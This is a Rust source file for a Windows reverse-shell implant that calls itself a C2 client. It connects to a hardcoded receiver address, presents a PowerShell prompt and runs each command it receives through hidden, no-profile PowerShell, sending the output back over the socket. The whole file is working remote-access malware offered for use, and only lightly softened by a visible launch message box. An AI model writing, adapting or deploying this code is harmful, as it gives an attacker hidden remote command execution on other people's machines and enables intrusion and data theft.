use std::{io::{Write, BufWriter, BufReader, BufRead}, net, process::Command};
use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MESSAGEBOX_STYLE};
use windows::core::PCSTR;
use windows::Win32::Foundation::HWND;
mod cmd;
use cmd::{parse_command, handle};

/// 
/// The receiver address. Change this!
/// 
const CONNECT_ADDRESS: &str = "192.168.1.111:8001";

///
/// Displays a Windows MessageBox at launch
/// 
fn show_messagebox(msg: &str) {
    unsafe {
        MessageBoxA(
            HWND(0),
            PCSTR(msg.as_ptr()), 
            PCSTR("Hello!\x00".as_ptr()), 
            MESSAGEBOX_STYLE(0)
        );
    }
}

fn main() {
    show_messagebox("C2 Activated!\x00");

    // The primary TCP socket connection
    let connection =
        net::TcpStream::connect(CONNECT_ADDRESS).expect("Couldn't establish TCP connection");

    // We have to clone the stream for the writer, because this constructor
    // _moves_ the stream out of scope    
    let mut tx = BufWriter::new(connection.try_clone().unwrap());

    // We can use the original stream for this, because we no longer care about the move
    let mut rx = BufReader::new(connection);

    // Initialize an empty String to hold our received data
    let mut read_buf = String::new();

    loop {
        // Clear the buffer from the last go-round
        read_buf.clear();

        // Send our prompt
        tx.write_all("\nPS $> ".as_bytes()).unwrap();
        // This ensure the  BufWriter data has been sent
        tx.flush().unwrap();

        // Handle what we get back
        match rx.read_line(&mut read_buf) {

            Ok(bytes_written) => {
                if bytes_written > 0 {

                    // Remove the newline
                    let cmd = read_buf.trim();

                    // Let's check to see if we have a real Command
                    if cmd.starts_with('!') {
                        match parse_command(cmd) {
                            Some(c) => {
                                // Send the command output
                                match handle(c) {
                                    Ok(res) => {
                                        tx.write_all(format!("[+] {res}").as_bytes()).unwrap();
                                    },
                                    Err(e) => {
                                        tx.write_all(format!("[!] {e}").as_bytes()).unwrap();
                                    }
                                }
                            },
                            None => {
                                tx.write_all(format!("Bad Command: {cmd}").as_bytes()).unwrap();
                            }
                        }
                    } else {
                        // Use the Command builder pattern to construct our
                        // not-at-all-stealthy command
                        let output = Command::new("powershell")
                        .arg("-nop")
                        .arg("-w")
                        .arg("hidden")
                        .arg("-c")
                        .arg(cmd)
                        .output()
                        .expect("Command failed!");  
    
                        // Join stdout and stderr in the output
                        tx.write_all(&output.stdout).unwrap();
                        tx.write_all(&output.stderr).unwrap();
                        
                    }
                    tx.flush().unwrap();


                } else {
                    println!("Connection closed."); 
                    break;
                }
            },
            Err(_) => { println!("Connection closed."); break; }
        }
    }

}
